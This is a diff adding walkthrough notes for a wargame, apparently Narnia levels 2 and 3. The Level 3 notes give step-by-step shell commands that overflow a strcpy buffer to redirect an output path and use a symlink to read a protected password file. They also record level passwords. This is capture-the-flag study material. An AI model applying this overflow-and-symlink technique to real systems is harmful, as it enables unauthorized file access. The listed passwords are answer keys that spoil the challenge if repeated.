@@ -37,3 +37,17 @@ Level 2: (Shellcode Injection through strcpy())
 	- we may need to run it a few time with different buf_addresses (change few bits in LSB until it works)
 	- Password: 2xszzNl6uG
 
+Level 3:
+	- like before ./narnia3 uses strcpy() to copy a filepath to ifile variable  of size 32
+	- the strcpy causes an overflow an effects the ofile value of "/dev/null"
+	- if we input a path with 33+x characters then ofile value is changed to whatever those x characters are
+	- run 'mkdir -p $(python3 -c 'print ("/tmp/"+"A"*27+"/tmp")')'
+	- run 'cd $(python3 -c 'print ("/tmp/"+"A"*27+"/tmp")')'
+	- now create a symbolic link file named 'output' with '/etc/narnia_pass/narnia4'
+	- make a file '/tmp/output' (make sure it is in the actual /tmp and not in the directory we created)
+	- run 'chmod 777 /tmp/output'
+	- run '/narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output'
+	- this causes the ofile to be '/tmp/output'
+	- now run 'cat /tmp/output' and we get the password
+	- Password: iqNWNk173q 
+ 
